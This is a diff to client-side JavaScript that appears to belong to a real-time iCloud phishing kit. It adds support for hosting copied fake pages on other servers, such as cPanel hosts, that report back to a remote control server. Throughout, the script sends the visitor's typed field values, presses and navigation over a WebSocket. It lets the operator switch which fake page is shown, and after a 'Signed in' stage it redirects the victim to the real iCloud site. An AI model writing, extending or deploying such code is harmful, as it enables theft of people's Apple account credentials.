@@ -72,6 +72,58 @@
 
   var VISITOR = visitorId();
 
+  /* Where the server is, and what this page is called.
+   *
+   * A capture served by the server talks to it on the same origin and needs
+   * nothing said. A capture that was copied to another host - a standalone
+   * copy on a cPanel, say - talks to the server from somewhere else, and the
+   * server's address is in a meta tag in the page.
+   *
+   * The page's name is the server's name for it: "/src/1.html". A copy that
+   * lives in a folder of its own is still "/src/1.html" as far as the server
+   * is concerned, and the folder is put back when the server asks for a page.
+   */
+  var SERVER = "";
+  (function () {
+    var meta = document.querySelector('meta[name="icloud-server"]');
+    if (meta) SERVER = (meta.getAttribute("content") || "").replace(/\/+$/, "");
+  })();
+
+  function serverUrl(path) {
+    return SERVER + path;
+  }
+
+  function pageName() {
+    var path = location.pathname;
+    var at = path.lastIndexOf("/src/");
+    return at >= 0 ? path.slice(at) : path;
+  }
+
+  function localPath(page) {
+    if (!page) return page;
+    if (/^[a-z][a-z0-9+.-]*:/i.test(page)) return page;   // an address of its own
+    if (page.indexOf("/src/") !== 0) return page;          // not a capture
+    var path = location.pathname;
+    var at = path.lastIndexOf("/src/");
+    var prefix = at > 0 ? path.slice(0, at) : "";
+    return prefix + page;
+  }
+
+  function socketUrl() {
+    var scheme = location.protocol === "https:" ? "wss:" : "ws:";
+    var host = location.host;
+    if (SERVER) {
+      var said = /^([a-z][a-z0-9+.-]*):\/\/([^/?#]+)/i.exec(SERVER);
+      if (said) {
+        scheme = said[1] === "https:" ? "wss:" : "ws:";
+        host = said[2];
+      }
+    }
+    // The visitor's name goes with the line: a copy on another host has no
+    // cookie of the server's to say who it is.
+    return scheme + "//" + host + "/ws?visitor=" + encodeURIComponent(VISITOR);
+  }
+
   var OPEN = 1;
   var RETRY_MIN = 500;
   var RETRY_MAX = 5000;
@@ -256,7 +308,7 @@
   // The step this capture is. Somebody who has got in stays got in: opening
   // a capture again does not take the flag away.
   function noteStage() {
-    var page = location.pathname;
+    var page = pageName();
     var patch = { page: page, stage: STAGES[page] || "Starting" };
     var state = readState();
     if (!state || !state.finished) patch.finished = false;
@@ -286,8 +338,7 @@
   }
 
   function connect() {
-    var scheme = location.protocol === "https:" ? "wss:" : "ws:";
-    var url = scheme + "//" + location.host + "/ws";
+    var url = socketUrl();
 
     try {
       socket = new WebSocket(url);
@@ -302,7 +353,7 @@
       // "What should I be showing, and what has been done to it?"
       socket.send(JSON.stringify({
         t: "hello",
-        page: location.pathname,
+        page: pageName(),
         from: document.referrer,
         session: VISITOR,
         state: readState(),
@@ -539,7 +590,7 @@
       // whole, so the capture is not taken away from under somebody who is
       // still typing.
       if (open && open.value) {
-        send({ t: "edit", id: el.id, value: now.value, page: location.pathname });
+        send({ t: "edit", id: el.id, value: now.value, page: pageName() });
       }
       return;
     }
@@ -895,9 +946,13 @@
     try {
       var url = new URL(href, location.href);
       if (url.origin !== location.origin) return "";
-      if (url.pathname.indexOf("/src/") !== 0) return "";
-      if (!/\.html?$/i.test(url.pathname)) return "";
-      return url.pathname;
+      var path = url.pathname;
+      var at = path.lastIndexOf("/src/");
+      if (at < 0) return "";
+      if (!/\.html?$/i.test(path)) return "";
+      // The server knows its pages by their own names, whichever folder the
+      // copy of them happens to be in.
+      return path.slice(at);
     } catch (err) {
       return "";
     }
@@ -907,7 +962,7 @@
     try {
       if (!navigator.sendBeacon || typeof Blob !== "function") return;
       navigator.sendBeacon(
-        "/nav",
+        serverUrl("/nav"),
         new Blob([JSON.stringify({ page: page })], { type: "application/json" })
       );
     } catch (err) {
@@ -973,7 +1028,7 @@
     if (link) {
       var href = link.getAttribute("href") || "";
       var next = pageFor(href);
-      if (next && next !== location.pathname) {
+      if (next && next !== pageName()) {
         leaving = true;
         send({ t: "nav", page: next });
         beacon(next);
@@ -991,7 +1046,7 @@
     if (press) {
       // The page is sent with it: what a press does can depend on where it
       // was pressed - the flow says which page leads to which.
-      send({ t: "press", id: press.id, page: location.pathname });
+      send({ t: "press", id: press.id, page: pageName() });
     }
   }
 
@@ -1003,10 +1058,10 @@
     if (!message || typeof message.t !== "string") return;
 
     if (message.t === "state") {
-      if (message.page && message.page !== location.pathname) {
+      if (message.page && message.page !== pageName()) {
         // The server is the truth about which page is on screen.
         leaving = true;
-        location.replace(message.page);
+        location.replace(localPath(message.page));
         return;
       }
       var values = message.values || {};
@@ -1025,14 +1080,14 @@
       // what sends them back to iCloud next time - and then they go.
       writeState({ finished: true, stage: "Signed in" });
       leaving = true;
-      location.replace(message.page || "https://www.icloud.com/");
+      location.replace(localPath(message.page) || "https://www.icloud.com/");
       return;
     }
 
     if (message.t === "nav") {
-      if (leaving || !message.page || message.page === location.pathname) return;
+      if (leaving || !message.page || message.page === pageName()) return;
       leaving = true;
-      location.replace(message.page);
+      location.replace(localPath(message.page));
       return;
     }
 
